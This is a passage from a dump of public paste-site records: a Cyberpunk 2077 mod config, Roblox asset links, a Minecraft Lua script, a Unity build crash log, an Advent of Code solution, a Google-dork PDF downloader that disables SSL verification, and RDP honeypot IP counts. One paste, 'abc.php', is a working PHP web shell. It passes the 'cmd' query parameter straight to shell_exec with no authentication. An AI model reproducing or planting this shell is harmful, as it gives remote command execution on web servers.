}"
NxPpe53y,Mod Fix: Blackwall Quickhacks enabled and Iconic version via PL story,michaelrw,YAML,Tuesday 19th of December 2023 08:39:25 PM CDT,"# mod made by AliceMods662
# updated by exploiteddna 19Dec2023 :) 

Items.BlackwallGateway_Songbird:
  $base: Items.BlackWallProgramLvl4
  entityName: sy_blackwallbreach
  appearanceName: sy_blackwallbreach_
  displayName: BlackwallDisplayName
  quality: Quality.Legendary
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_iconic_blackwallBreach
  tags:
    - itemPart
    - SoftwareShard
    - Tier2Shard
    - Tier3Shard
    - Tier4Shard
  objectActions:
    - ItemAction.ProgramDisassemble
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic

  statModifiers:
    - Quality.IconicItem
  CraftingData: Items.BlackwallBreachCraftingPackage
  OnAttach: [ EquipmentGLP.BlackwallBreachProgramLvl4 ]

Items.BlackwallBreachCraftingPackage:
  $type: gamedataCraftingPackage_Record
  craftingExpModifier: 1
  craftingRecipe:
    - Items.LegendaryProgramCraftingPackage_blackwall
    - Items.LegendaryProgramCraftingPackage_blackwall_inline0
  overcraftPenaltyModifier: 1

Items.LegendaryProgramCraftingPackage_blackwall:
  $type: gamedataRecipeElement_Record
  amount: 75
  ingredient: Items.QuickHackLegendaryMaterial1

Items.LegendaryProgramCraftingPackage_blackwall_inline0:
  $type: gamedataRecipeElement_Record
  amount: 1
  ingredient: Items.Q305_Cerberus_core_cracked

# ------------------------- mechanics --------------------------


QuickHack.BlackWallHackIconic:
    $type: gamedataObjectAction_Record
    actionName: BlackWall
    hackCategory: HackCategory.UltimateHack
    interactionLayer: remote
    objectActionType: ObjectActionType.PuppetQuickHack
    objectActionUI: Interactions.BlackwallHack
    priority: 3
    activationTime:
      - QuickHack.BaseBlackWallHackIconic_inline11
    completionEffects:
      - QuickHack.QuickHack_inline2
      - QuickHack.QuickHack_inline6
      - QuickHack.QuickHack_inline8
      - QuickHack.QuickHack_inline9
      - QuickHack.UltimateHack_inline5
      - QuickHack.BaseBlackWallHack_inline9
      - QuickHack.BlackWallHackIconic_inline3
      - QuickHack.BlackWallHack_inline6
      - QuickHack.BlackWallHack_inline12
    costs:
      - QuickHack.BaseBlackWallHackIconic_inline7
    durationTime: []
    instigatorActivePrereqs: []
    instigatorPrereqs:
      - QuickHack.QuickHack_inline1
      - QuickHack.BaseBlackWallHack_inline0
    rewards: []
    startEffects:
      - QuickHack.QuickHack_inline10
      - QuickHack.UltimateHack_inline1
      - QuickHack.BaseBlackWallHack_inline1
      - QuickHack.BaseBlackWallHack_inline2
      - QuickHack.BaseBlackWallHackIconic_inline3
      - QuickHack.BaseBlackWallHackIconic_inline4
      - QuickHack.BaseBlackWallHack_inline5
      - QuickHack.BlackWallHackIconic_inline0
    targetActivePrereqs:
      - Prereqs.QuickHackUploadingPrereq
      - Prereqs.ChimeraNoQuickHackPrereq
      - Prereqs.QuickHackTargetMortalPrereq
      - Prereqs.BlackwallPrereq
    targetPrereqs: []
    awarenessCost: QuickHack.UltimateHack_inline2
    memoryCostReductionInOverclock: 0.725000024
    isQuickHack: True

QuickHack.BaseBlackWallHackIconic_inline7: #costs
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BaseBlackWallHackIconic_inline8


QuickHack.BaseBlackWallHackIconic_inline8:
  $type: gamedataConstantStatModifier_Record
  value: 12
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BaseBlackWallHackIconic_inline11:
  $type: gamedataConstantStatModifier_Record
  value: 8
  modifierType: Additive
  statType: BaseStats.QuickHackUpload

QuickHack.BlackWallHackIconic_inline3:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline4
  recipient: ObjectActionReference.Target

QuickHack.BaseBlackWallHackIconic_inline11_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

QuickHack.BlackwallHackIconic_inline0:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline1
  recipient: ObjectActionReference.Target

QuickHack.BlackWallHackIconic_inline1:
    $type: gamedataSpreadEffector_Record
    effectTag: spread
    objectAction: QuickHack.BlackwallHackIconicBounce2
    spreadToAllTargetsInTheArea: False
    effectorClassName: SpreadEffector
    prereqRecord: QuickHack.BlackWallHack_inline2
    removeAfterActionCall: False
    removeAfterPrereqCheck: False
    statModifierGroups: []

QuickHack.BlackWallHackIconic_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []


#----------------------------------------------------------- BOUNCE 2---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce2:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackIconicBounce2_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce2_inline8
    - QuickHack.BlackwallHackBounce2_inline11
    - QuickHack.BlackwallHackBounce2_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce2_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce2_inline3
    - QuickHack.BlackwallHackBounce2_inline4
    - QuickHack.BlackwallHackBounce2_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce2_inline1:
  $base: QuickHack.BlackwallHackBounce2_inline1
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce2_inline2

QuickHack.BlackwallHackIconicBounce2_inline2:
  $base: QuickHack.BlackwallHackBounce2_inline2
  value: 16

QuickHack.BlackwallHackIconicBounce2_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce2_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce2_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce3
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce2_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []
#----------------------------------------------------------- BOUNCE 3---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce3:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce3_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce3_inline8
    - QuickHack.BlackwallHackBounce3_inline11
    - QuickHack.BlackwallHackBounce3_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce3_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce3_inline3
    - QuickHack.BlackwallHackBounce3_inline4
    - QuickHack.BlackwallHackBounce3_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce3_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce3_inline2

QuickHack.BlackwallHackIconicBounce3_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 19
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce3_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce3_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce3_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce4
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce3_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 4---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce4:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce4_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce4_inline8
    - QuickHack.BlackwallHackBounce4_inline11
    - QuickHack.BlackwallHackBounce4_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce4_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce4_inline3
    - QuickHack.BlackwallHackBounce4_inline4
    - QuickHack.BlackwallHackBounce4_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce4_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce4_inline2

QuickHack.BlackwallHackIconicBounce4_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 23
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce4_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce4_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce4_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce5
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce4_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 5---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce5:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce5_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce5_inline8
    - QuickHack.BlackwallHackBounce5_inline11
    - QuickHack.BlackwallHackBounce5_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce5_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce5_inline3
    - QuickHack.BlackwallHackBounce5_inline4
    - QuickHack.BlackwallHackBounce5_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce5_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce5_inline2

QuickHack.BlackwallHackIconicBounce5_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 25
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce5_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce5_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce5_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce6
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce5_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

  #----------------------------------------------------------- BOUNCE 6---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce6:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce6_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackBounce6_inline5
    - QuickHack.BlackwallHackBounce6_inline11
  costs:
    - QuickHack.BlackwallHackBounce6_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce6_inline3
    - QuickHack.BlackwallHackBounce6_inline4
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackBounce6_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackBounce6_inline2

QuickHack.BlackwallHackBounce6_inline2:
    $type: gamedataConstantStatModifier_Record
    value: 26
    modifierType: Additive
    statType: BaseStats.Memory

#--------------------------- ENABLE -----------------------------------------------------------------
Items.BlackWallProgramLvl4:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

Items.BlackWallProgramLvl3:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach


Items.BlackWallProgramLvl2:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

LootTables.ep1_q306_songbirds_cache.maxItemsToLoot: 4
LootTables.ep1_q306_songbirds_cache.minItemsToLoot: 4

#------------------------------------------------------- WEIRD SHIT --------------------------------------
#Vendors.wat_kab_netrunner_01.itemStock:
#  - !append Vendors.wat_kab_netrunner_blackwallGatewaySy

Vendors.wat_kab_netrunner_blackwallGatewaySy:
  $type: gamedataVendorItem_Record
  item: Items.BlackwallGateway_Songbird
  generationPrereqs: [ Prereqs.BlackwallBreachAtYoko ]
  quantity: [ Vendors.IsPresent ]

Vendors.BlackwallPresent:
  $type: gamedataRandomStatModifier_Record
  max: 1
  min: 1
  useControlledRandom: False
  modifierType: Additive
  statType: BaseStats.Quantity

Prereqs.BlackwallBreachAtYoko:
  $type: IPrereq
  prereqClassName: FactValuePrereq

Prereqs.BlackwallBreachAtYoko.comparisonType: n""LessOrEqual""
Prereqs.BlackwallBreachAtYoko.fact: n""q305_ib_datafort_shutdown_finished""
Prereqs.BlackwallBreachAtYoko.value: 0

LootTables.ep1_q306_songbirds_cache.lootItems:
  - LootTables.ep1_q306_songbirds_cache_inline0
  - LootTables.ep1_q306_songbirds_cache_inline1
  - LootTables.ep1_q306_songbirds_cache_inline2
  - LootTables.ep1_q306_songbirds_cache_inline3

LootTables.ep1_q306_songbirds_cache_inline3:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.lootItems:
  - !append LootTables.ep1_q305_haunted_deck_recipe_Blackwall
  - !append LootTables.ep1_q305_haunted_deck_inline4

LootTables.ep1_q305_haunted_deck_recipe_Blackwall:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.maxItemsToLoot: 5
LootTables.ep1_q305_haunted_deck_recipe.minItemsToLoot: 2

EquipmentGLP.BlackwallBreachProgramLvl4:
  $type: gamedataGameplayLogicPackage_Record
  stackable: False
  UIData: EquipmentGLP.BlackwallBreachProgramLvl4_inline0
  animationWrapperOverrides: []
  effectors: []
  items: []
  statPools: []
  stats: []

EquipmentGLP.BlackwallBreachProgramLvl4_inline0:
  $type: gamedataGameplayLogicPackageUIData_Record
  floatValues: [ 5,20 ]
  iconPath: ability_utility
  intValues: []
  localizedDescription: LocKey#blackwall_quickhack_iconic_desc
  localizedName: LocKey#BlackwallAppearanceName
  nameValues: []
  stats: []
"
xHL9xeKF,bodycolorrs,Lancere,Lua,Tuesday 19th of December 2023 08:29:02 PM CDT,null nil 125 125 125 Body Colors 125 125 125 true
iyCMj3JN,Untitled,Lancere,Lua,Tuesday 19th of December 2023 08:27:36 PM CDT,https://pastebin.com/raw/xHL9xeKF?userid=2;http://www.roblox.com/Asset/?id=1272714;http://www.roblox.com/Asset/?id=305888394;http://www.roblox.com/Asset/?id=6340141;http://www.roblox.com/Asset/?id=27112025;http://www.roblox.com/Asset/?id=32336182;http://www.roblox.com/Asset/?id=32336117;http://www.roblox.com/Asset/?id=27112056;http://www.roblox.com/Asset/?id=27112068;http://www.roblox.com/Asset/?id=10831454;http://www.roblox.com/Asset/?id=25926517&type=gear;http://www.roblox.com/Asset/?id=47044627;http://www.roblox.com/Asset/?id=5200062;http://www.roblox.com/Asset/?id=389012259;
aELNPxLG,abc.php,Nizar-Dev,PHP,Tuesday 19th of December 2023 07:59:21 PM CDT,"<?php
// shell.php
if(isset($_GET['cmd'])) {
    $output = shell_exec( $_GET['cmd'] );
    $html = isset($_GET['html']) ? true : false;
    if($html === true) {
        echo ""<pre>\n"";
    }
    echo $output;
    if($html === true) {
        echo ""</pre>\n"";
    }
    exit;
}
?>"
UijkVi6v,dork downloader (PDFs),nitestryker,Python,Tuesday 19th of December 2023 07:55:33 PM CDT,"#!/bin/python
# Copyright 2023 Nitestryker

# This software is provided 'as-is', without any express or implied
# warranty.  In no event will the authors be held liable for any damages
#  arising from the use of this software.

#  Permission is granted to anyone to use this software for any purpose,
#  including commercial applications, and to alter it and redistribute it
#  freely, subject to the following restrictions:

#  1. The origin of this software must not be misrepresented; you must not
#     claim that you wrote the original software. If you use this software
#     in a product, an acknowledgment in the product documentation would be
#    appreciated but is not required.
#  2. Altered source versions must be plainly marked as such, and must not be
#     misrepresented as being the original software.
#  3. This notice may not be removed or altered from any source distribution.

import requests
import os

def download_pdf(url, output_path):
    #response = requests.get(url, stream=True)
    response = requests.get(url, stream=True, verify=False) # Disable SSL certificate verification
    if response.status_code == 200:
        with open(output_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
        print(f""Downloaded: {output_path}"")
    else:
        print(f""Failed to download: {url} (Status Code: {response.status_code})"")

def search_and_download(query, num_results, base_url, output_dir):
    # Perform the Google search using the query
    search_url = f""{base_url}/search?q={query}""
    response = requests.get(search_url)
    search_results = response.text

    # Create the output directory if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Keep track of the number of downloaded PDFs
    downloaded_count = 0

    # Extract and download PDF links
    start_index = 0
    while downloaded_count < num_results:
        start_link = search_results.find('<a href=""/url?q=', start_index)
        end_link = search_results.find('&amp;', start_link + 1)
        if start_link == -1 or end_link == -1:
            break

        url = search_results[start_link + 16: end_link]
        if url.endswith('.pdf'):
            filename = url.split(""/"")[-1]
            output_path = os.path.join(output_dir, filename)
            download_pdf(url, output_path)
            downloaded_count += 1

        start_index = end_link

# Set the query, number of results to retrieve, base URL, and output directory
query = 'filetype:pdf programming'
num_results = 10
base_url = ""https://www.google.com""
output_dir = ""pdfs""

# Call the search_and_download function
search_and_download(query, num_results, base_url, output_dir)
"
BfhiCXW2,CC Advanced Peripheral Minecolonies ME Supplier,ecco7777,Lua,Tuesday 19th of December 2023 07:44:49 PM CDT,"me=peripheral.wrap(""top"")
mc=peripheral.wrap(""back"")
stuff=mc.getWorkOrderResources(1)
for i=1,#stuff do
    item={}
    item.name=stuff[i].item
    item.count=stuff[i].needed-stuff[i].available
    if stuff.status~=""NOT_NEEDED"" then
        me.exportItem(item,""up"")
    end
end"
XuchtCx4,Unity android build error report 20.12.23,fahimkamal63,C++,Tuesday 19th of December 2023 07:12:22 PM CDT,"Building Library\Bee\artifacts\Android\iz17e\j7y14mr6e1nw.o failed with output:
PLEASE submit a bug report to https://github.com/android-ndk/ndk/issues and include the crash backtrace, preprocessed source, and associated run script.
Stack dump:
0.	Program arguments: ""C:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/PlaybackEngines/AndroidPlayer/NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/clang++"" -march=armv7-a -mfloat-abi=softfp -mfpu=neon-fp16 -marm -D__ARM_ARCH_7__ -D__ARM_ARCH_7A__ -D__ANDROID_UNAVAILABLE_SYMBOLS_ARE_WEAK__ -faddrsig -mllvm -hoist-common-insts=1 -DANDROID -DHAVE_INTTYPES_H -no-canonical-prefixes -funwind-tables -fstack-protector -fomit-frame-pointer -std=c++11 -Wswitch -Wno-trigraphs -Wno-tautological-compare -Wno-invalid-offsetof -Wno-implicitly-unsigned-literal -Wno-integer-overflow -Wno-shift-negative-value -Wno-unknown-attributes -Wno-implicit-function-declaration -Wno-null-conversion -Wno-missing-declarations -Wno-unused-value -Wno-pragma-once-outside-header -fvisibility=hidden -fexceptions -fno-rtti -g -Os -fPIC -fno-strict-overflow -ffunction-sections -fdata-sections -fmessage-length=0 -pipe -D_GLIBCXX_USE_CXX11_ABI=0 -DBASELIB_INLINE_NAMESPACE=il2cpp_baselib -DIL2CPP_MONO_DEBUGGER_DISABLED -DRUNTIME_IL2CPP -DHAVE_BDWGC_GC -DNDEBUG -I. ""-ID:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp/pch"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/external/baselib/Include"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp/os/ClassLibraryPAL/brotli/include"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/external/baselib/Platforms/Android/Include"" -o Library/Bee/artifacts/Android/iz17e/j7y14mr6e1nw.o -fcolor-diagnostics -fdiagnostics-absolute-paths -target armv7a-linux-androideabi22 -fstrict-aliasing -fdiagnostics-format=msvc -c -x c++ ""D:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp/Newtonsoft.Json__2.cpp""
1.	<eof> parser at end of file
2.	Code generation
3.	Running pass 'Function Pass Manager' on module 'D:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp/Newtonsoft.Json__2.cpp'.
4.	Running pass 'ARM Instruction Selection' on function '@U3CU3CInternalWriteEndAsyncU3Eg__AwaitPropertyU7C11_0U3Ed_MoveNext_mC69ECC163AA17C93589D91B7C90A3B52CF496967'
#0 0x000000fa6adfa948 
#1 0x00007ff773051ec8 C:\Program Files\Unity\Hub\Editor\2022.3.5f1\Editor\Data\PlaybackEngines\AndroidPlayer\NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\clang++.exe 0x4ab1ec8 
0x000000FA6ADFA948 (0x0000000000000000 0x000002DA30EF7D90 0x000000FA6ADFA948 0x0000000000000000) <unknown module>
0x00007FF773051EC8 (0x000002DA30EF7D90 0x000000FA6ADFA948 0x0000000000000000 0x0000000000000000)

UnityEngine.GUIUtility:ProcessEvent (int,intptr,bool&)"
ejTsRsqD,Advent of code 2023 day 19 part2 improved,hhoppe,Python,Tuesday 19th of December 2023 07:12:05 PM CDT,"def day19_part2(s):
  s_rules, _ = s.split('\n\n')
  rules = {}
  for line in s_rules.splitlines():
    name, s_rules = line[:-1].split('{')
    rules[name] = s_rules.split(',')

  def compute(name, intervals):
    if name == 'R' or any(start >= stop for start, stop in intervals.values()):
      return 0
    if name == 'A':
      return math.prod(stop - start for start, stop in intervals.values())

    total = 0
    for rule in rules[name]:
      if rule.isalpha():
        return total + compute(rule, intervals)

      category, op, s_num, label = re.match(r'^(\w)([<>])(\d+):(\w+)$', rule).groups()
      num = int(s_num)
      start, stop = intervals[category]
      if op == '<':
        total += compute(label, intervals | {category: (start, min(stop, num))})
        intervals[category] = max(start, num), stop
      else:
        total += compute(label, intervals | {category: (max(start, num + 1), stop)})
        intervals[category] = start, min(stop, num + 1)

  return compute('in', {category: (1, 4001) for category in 'xmas'})"
23AQL6FB,2023-12-19_stats.json,rdp_snitch,JSON,Tuesday 19th of December 2023 06:18:18 PM CDT,"{
  ""ip"": {
    ""103.178.235.43"": 222,
    ""88.214.26.3"": 12,
    ""103.76.139.213"": 3,
    ""43.156.144.223"": 3,
    ""103.142.86.61"": 3,
    ""58.218.204.183"": 12,
    ""62.204.41.208"": 18,
    ""205.210.31.169"": 9,
    ""141.98.81.79"": 3,
